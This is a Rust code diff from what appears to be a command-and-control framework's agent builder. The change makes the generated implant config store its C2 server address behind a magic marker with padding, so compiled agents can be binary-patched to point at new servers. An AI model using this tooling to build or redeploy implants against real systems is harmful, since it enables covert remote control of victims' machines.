@@ -26,13 +26,92 @@ pub fn generate_agent(
     let config_dir = format!("{}/src", agent_relative_path);
     std::fs::create_dir_all(&config_dir)?;
 
-    // Generar config.rs (solo servidor C2, sin shellcode ni encriptación)
+    // Generar config.rs con marcador para binary patching
     let config_file_path = format!("{}/src/config.rs", agent_relative_path);
     let mut config_file = File::create(&config_file_path)?;
+
+    // Crear cadena con marcador + IP:PORT + padding nulo (total 96 bytes)
+    // Marcador: 32 bytes + Dirección máxima: 64 bytes = 96 bytes total
+    let marker = "C2R2_SERVER_ADDRESS_PLACEHOLDER_";
+    let max_addr_len = 64;
+    let padded_server = format!("{}{:\0<width$}", marker, c2_server, width = max_addr_len);
 
     writeln!(
         config_file,
         "// Generado automáticamente por C2R2 Builder v2.0"
+    )?;
+    writeln!(
+        config_file,
+        "// IMPORTANTE: Este archivo contiene un marcador para permitir binary patching sin recompilación\n"
+    )?;
+    writeln!(
+        config_file,
+        "// Dirección del servidor C2 con marcador mágico y padding para permitir reemplazo in-place"
+    )?;
+    writeln!(
+        config_file,
+        "// Formato: \"C2R2_SERVER_ADDRESS_PLACEHOLDER_\" + \"IP:PORT\" + padding nulo (total 96 bytes)"
+    )?;
+    writeln!(
+        config_file,
+        "// El marcador permite localizar esta cadena en el binario y reemplazar la IP sin recompilar"
+    )?;
+    writeln!(
+        config_file,
+        "// NOTA: Se usa #[used] y #[no_mangle] para evitar que el compilador elimine o optimice esta constante"
+    )?;
+    writeln!(
+        config_file,
+        "#[used]"
+    )?;
+    writeln!(
+        config_file,
+        "#[no_mangle]"
+    )?;
+    writeln!(
+        config_file,
+        "pub static C2_SERVER_PADDED: &[u8; 96] = b\"{}\";\n",
+        padded_server
+    )?;
+    writeln!(
+        config_file,
+        "/// Obtiene la dirección del servidor C2 limpia (sin marcador ni padding)"
+    )?;
+    writeln!(
+        config_file,
+        "/// Esto extrae solo la parte \"IP:PORT\" después del marcador"
+    )?;
+    writeln!(
+        config_file,
+        "pub fn get_c2_server() -> &'static str {{"
+    )?;
+    writeln!(
+        config_file,
+        "    // El marcador tiene 32 bytes, después viene la IP:PORT"
+    )?;
+    writeln!(
+        config_file,
+        "    let without_marker = &C2_SERVER_PADDED[32..];"
+    )?;
+    writeln!(
+        config_file,
+        "    // Convertir bytes a str y remover padding nulo"
+    )?;
+    writeln!(
+        config_file,
+        "    let str_slice = std::str::from_utf8(without_marker).unwrap_or(\"\");"
+    )?;
+    writeln!(
+        config_file,
+        "    str_slice.trim_end_matches('\\0')"
+    )?;
+    writeln!(
+        config_file,
+        "}}\n"
+    )?;
+    writeln!(
+        config_file,
+        "// Para compatibilidad con código existente"
     )?;
     writeln!(
         config_file,
